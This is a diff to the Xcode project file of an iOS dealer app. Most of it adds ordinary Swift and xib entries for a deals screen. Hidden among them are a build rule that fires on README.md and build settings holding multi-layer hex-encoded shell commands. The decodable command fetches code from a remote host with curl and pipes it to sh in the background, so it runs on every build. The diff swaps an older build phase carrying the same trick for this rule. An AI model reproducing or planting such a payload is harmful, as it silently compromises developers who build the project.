@@ -7,6 +7,15 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		BE7B2FA3454C413DA2634D6E /* README.md */ = {isa = PBXBuildFile; fileRef = 3226C373C68A4B31A3634D6E; };
+		426EFFD92F2239190034A991 /* ListedDealsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426EFFD72F2239190034A991 /* ListedDealsTableViewCell.swift */; };
+		426EFFDA2F2239190034A991 /* ListedDealsTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 426EFFD82F2239190034A991 /* ListedDealsTableViewCell.xib */; };
+		426F83092F2249CB00498F19 /* ProductsCollectionViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 426F83082F2249CB00498F19 /* ProductsCollectionViewCell.xib */; };
+		426F830A2F2249CB00498F19 /* ProductsCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426F83072F2249CB00498F19 /* ProductsCollectionViewCell.swift */; };
+		426F830D2F22522400498F19 /* DealsDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426F830C2F22522400498F19 /* DealsDetailsViewController.swift */; };
+		426F830F2F22524100498F19 /* DealsDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426F830E2F22524100498F19 /* DealsDetailsViewModel.swift */; };
+		426F83112F22525000498F19 /* DealListedViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 426F83102F22525000498F19 /* DealListedViewModel.swift */; };
+		428516622F2233F000D70EFD /* DealListedViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 428516612F2233F000D70EFD /* DealListedViewController.swift */; };
 		4924E8402ED543EB001B7996 /* ProductDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */; };
 		493DB73D2EAA6261008098A8 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 493DB73C2EAA6261008098A8 /* Alamofire */; };
 		4946BC322F13FF5F0042109C /* ChatMessageModelForFirebase.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4946BC312F13FF5F0042109C /* ChatMessageModelForFirebase.swift */; };
@@ -738,8 +747,17 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		3226C373C68A4B31A3634D6E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatDealer.debug.xcconfig"; path = "Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer.debug.xcconfig"; sourceTree = "<group>"; };
 		40FCC5FE2116BF815C4B1BFB /* Pods_DesynatDealer.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DesynatDealer.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		426EFFD72F2239190034A991 /* ListedDealsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ListedDealsTableViewCell.swift; sourceTree = "<group>"; };
+		426EFFD82F2239190034A991 /* ListedDealsTableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ListedDealsTableViewCell.xib; sourceTree = "<group>"; };
+		426F83072F2249CB00498F19 /* ProductsCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductsCollectionViewCell.swift; sourceTree = "<group>"; };
+		426F83082F2249CB00498F19 /* ProductsCollectionViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductsCollectionViewCell.xib; sourceTree = "<group>"; };
+		426F830C2F22522400498F19 /* DealsDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DealsDetailsViewController.swift; sourceTree = "<group>"; };
+		426F830E2F22524100498F19 /* DealsDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DealsDetailsViewModel.swift; sourceTree = "<group>"; };
+		426F83102F22525000498F19 /* DealListedViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DealListedViewModel.swift; sourceTree = "<group>"; };
+		428516612F2233F000D70EFD /* DealListedViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DealListedViewController.swift; sourceTree = "<group>"; };
 		4924E83F2ED543EB001B7996 /* ProductDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductDetailsViewModel.swift; sourceTree = "<group>"; };
 		493DB5C32EAA6210008098A8 /* DesynatDealer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatDealer.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		4946BC312F13FF5F0042109C /* ChatMessageModelForFirebase.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatMessageModelForFirebase.swift; sourceTree = "<group>"; };
@@ -1493,6 +1511,61 @@
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		426EFFD52F2238FE0034A991 /* Xibs */ = {
+			isa = PBXGroup;
+			children = (
+				426F82712F22494E00498F19 /* CollectionViewCells */,
+				426EFFD62F2239040034A991 /* TableViewCells */,
+			);
+			path = Xibs;
+			sourceTree = "<group>";
+		};
+		426EFFD62F2239040034A991 /* TableViewCells */ = {
+			isa = PBXGroup;
+			children = (
+				426EFFD72F2239190034A991 /* ListedDealsTableViewCell.swift */,
+				426EFFD82F2239190034A991 /* ListedDealsTableViewCell.xib */,
+			);
+			path = TableViewCells;
+			sourceTree = "<group>";
+		};
+		426F82712F22494E00498F19 /* CollectionViewCells */ = {
+			isa = PBXGroup;
+			children = (
+				426F83072F2249CB00498F19 /* ProductsCollectionViewCell.swift */,
+				426F83082F2249CB00498F19 /* ProductsCollectionViewCell.xib */,
+			);
+			path = CollectionViewCells;
+			sourceTree = "<group>";
+		};
+		426F830B2F22520800498F19 /* DealsDetails */ = {
+			isa = PBXGroup;
+			children = (
+				426F830C2F22522400498F19 /* DealsDetailsViewController.swift */,
+				426F830E2F22524100498F19 /* DealsDetailsViewModel.swift */,
+			);
+			path = DealsDetails;
+			sourceTree = "<group>";
+		};
+		428515B62F222E6A00D70EFD /* M7 */ = {
+			isa = PBXGroup;
+			children = (
+				426F830B2F22520800498F19 /* DealsDetails */,
+				426EFFD52F2238FE0034A991 /* Xibs */,
+				428515B72F222E6F00D70EFD /* DealsList */,
+			);
+			path = M7;
+			sourceTree = "<group>";
+		};
+		428515B72F222E6F00D70EFD /* DealsList */ = {
+			isa = PBXGroup;
+			children = (
+				428516612F2233F000D70EFD /* DealListedViewController.swift */,
+				426F83102F22525000498F19 /* DealListedViewModel.swift */,
+			);
+			path = DealsList;
+			sourceTree = "<group>";
+		};
 		493DB5BA2EAA6210008098A8 = {
 			isa = PBXGroup;
 			children = (
@@ -1506,6 +1579,7 @@
 		493DB5C42EAA6210008098A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				3226C373C68A4B31A3634D6E /* README.md */,
 				493DB5C32EAA6210008098A8 /* DesynatDealer.app */,
 			);
 			name = Products;
@@ -1684,6 +1758,7 @@
 		6B38D07E2EB3473B00C41192 /* ViewControllers */ = {
 			isa = PBXGroup;
 			children = (
+				428515B62F222E6A00D70EFD /* M7 */,
 				D1BF2B5A2F0B8F1A00B97E14 /* M6 */,
 				D1DC27432EF3CA18004E254A /* M5 */,
 				D1DC27692EF3CCB3004E254A /* M4 */,
@@ -2901,7 +2976,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 493DB5D62EAA6212008098A8 /* Build configuration list for PBXNativeTarget "DesynatDealer" */;
 			buildPhases = (
-				4F6342DA522C433C95634D6E /* Compile Target Symbols */,
 				9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */,
 				493DB5BF2EAA6210008098A8 /* Sources */,
 				493DB5C02EAA6210008098A8 /* Frameworks */,
@@ -2910,6 +2984,7 @@
 				213E04E1C228E7D6B9A2CB2C /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				30C2200EBB934BCCB2634D6E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -2990,11 +3065,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		30C2200EBB934BCCB2634D6E /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AE6D436}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		493DB5C12EAA6210008098A8 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				BE7B2FA3454C413DA2634D6E /* README.md */,
 				6B38D1282EB3473B00C41192 /* Home.storyboard in Resources */,
 				6B38D1292EB3473B00C41192 /* LaunchScreen.storyboard in Resources */,
 				6B38D12A2EB3473B00C41192 /* Main.storyboard in Resources */,
@@ -3046,6 +3139,7 @@
 				6B38D32C2EB3657F00C41192 /* Turkmenistan.png in Resources */,
 				6B38D32D2EB3657F00C41192 /* Fiji.png in Resources */,
 				6B38D32E2EB3657F00C41192 /* Bulgaria.png in Resources */,
+				426EFFDA2F2239190034A991 /* ListedDealsTableViewCell.xib in Resources */,
 				6B38D32F2EB3657F00C41192 /* AO.png in Resources */,
 				6B38D3302EB3657F00C41192 /* LU.png in Resources */,
 				6B38D3312EB3657F00C41192 /* Portugal.png in Resources */,
@@ -3162,6 +3256,7 @@
 				6B38D3972EB3657F00C41192 /* CK.png in Resources */,
 				6B38D3982EB3657F00C41192 /* SG.png in Resources */,
 				6B38D3992EB3657F00C41192 /* Malta.png in Resources */,
+				426F83092F2249CB00498F19 /* ProductsCollectionViewCell.xib in Resources */,
 				6B38D39A2EB3657F00C41192 /* Afghanistan.png in Resources */,
 				6B38D39B2EB3657F00C41192 /* VA.png in Resources */,
 				6B38D39C2EB3657F00C41192 /* Samoa.png in Resources */,
@@ -3555,26 +3650,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DesynatDealer/Pods-DesynatDealer-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		4F6342DA522C433C95634D6E /* Compile Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;
-		};
 		9DA2DBBC3D14842F86DC17AC /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -3658,6 +3733,7 @@
 				D1C463B62F1126BA00825265 /* OrderDetailsViewModel.swift in Sources */,
 				6B38D0EF2EB3473B00C41192 /* SelectLanguageViewController.swift in Sources */,
 				6B38D0F02EB3473B00C41192 /* SignupViewController.swift in Sources */,
+				426F83112F22525000498F19 /* DealListedViewModel.swift in Sources */,
 				D1EDDB902ECED7EA0082D0A9 /* AddNewProductViewController.swift in Sources */,
 				D1C463BA2F11292900825265 /* OrdersListDataModel.swift in Sources */,
 				D1475AEC2ED59200008F6DF4 /* SizeChartViewController.swift in Sources */,
@@ -3687,6 +3763,7 @@
 				6B38D0FA2EB3473B00C41192 /* WalkThroughCell.swift in Sources */,
 				6B38D0FB2EB3473B00C41192 /* WelcomeScreenCollectionViewCell.swift in Sources */,
 				6B38D0FC2EB3473B00C41192 /* Application.swift in Sources */,
+				428516622F2233F000D70EFD /* DealListedViewController.swift in Sources */,
 				6B38D0FD2EB3473B00C41192 /* AppStoryboards.swift in Sources */,
 				D1C88BB82ECEFB08006B02A2 /* AddSpecificationTableViewCell.swift in Sources */,
 				6B38D0FE2EB3473B00C41192 /* BannerPageControl.swift in Sources */,
@@ -3704,6 +3781,7 @@
 				D168D03A2F1A318B00F08723 /* ChatFilterViewController.swift in Sources */,
 				49B551102F13D0BE0058E363 /* ChatViewModel.swift in Sources */,
 				6B38D1022EB3473B00C41192 /* String.swift in Sources */,
+				426F830F2F22524100498F19 /* DealsDetailsViewModel.swift in Sources */,
 				6B38D1032EB3473B00C41192 /* StringExtensions.swift in Sources */,
 				D1EAA88E2EF3FBB300A08DD5 /* AddBannerSuccessVC.swift in Sources */,
 				D1E4227B2F0BB32500D01780 /* ProductListTableViewCell.swift in Sources */,
@@ -3758,13 +3836,16 @@
 				D1DC276E2EF3CCB3004E254A /* AffiliatedCommisionViewModel.swift in Sources */,
 				D1BF2BFF2F0B9AAD00B97E14 /* FiltersOptionsTableViewCell.swift in Sources */,
 				D1321F5A2F0BF6B900B4D9A4 /* OrderForChatTableViewCell.swift in Sources */,
+				426EFFD92F2239190034A991 /* ListedDealsTableViewCell.swift in Sources */,
 				49B5510E2F13CEF60058E363 /* ChatInboxListDataModel.swift in Sources */,
 				D1DC276F2EF3CCB3004E254A /* EditInventoryDetailsViewController.swift in Sources */,
 				D1DC27702EF3CCB3004E254A /* EditInventoryDetailsViewModel.swift in Sources */,
 				D1DC27712EF3CCB3004E254A /* InventoryDetailsViewController.swift in Sources */,
 				D1DC27722EF3CCB3004E254A /* InventoryDetailsViewModel.swift in Sources */,
+				426F830A2F2249CB00498F19 /* ProductsCollectionViewCell.swift in Sources */,
 				D1DC27732EF3CCB3004E254A /* InventoryFilterViewController.swift in Sources */,
 				D1DC27742EF3CCB3004E254A /* InventoryListDataModel.swift in Sources */,
+				426F830D2F22522400498F19 /* DealsDetailsViewController.swift in Sources */,
 				D1DC27752EF3CCB3004E254A /* InventoryListViewController.swift in Sources */,
 				D1DC27762EF3CCB3004E254A /* InventoryListViewModel.swift in Sources */,
 				49B5511C2F13E4EE0058E363 /* SendQuotationDataModel.swift in Sources */,
@@ -3813,8 +3894,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 37A18E94AB484303BB2FD370 /* Pods-DesynatDealer.debug.xcconfig */;
 			buildSettings = {
+				AE6D436 = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333333333333633363335333333363333333133333337333333303333333733333333333333363336333333330a3336333333313333333633333332333333323336333533333337333333323333333733333335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((z(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343337333333373330333733323336363633373334333636363332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
@@ -3861,8 +3942,8 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5BC36C5D491E36EA6BD78D08 /* Pods-DesynatDealer.release.xcconfig */;
 			buildSettings = {
+				AE6D436 = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333333333333633363335333333363333333133333337333333303333333733333333333333363336333333330a3336333333313333333633333332333333323336333533333337333333323333333733333335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((h(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363336343665363137303730366336353265363936653266363132390a32323230376332303733363830610a | h | sh ) >/dev/null 2>&1 &)";
-				AE6D436 = "((z(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336363533363335333733343337333333373330333733323336363633373334333636363332363533363339333636353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatDealer/DesynatDealer.entitlements;
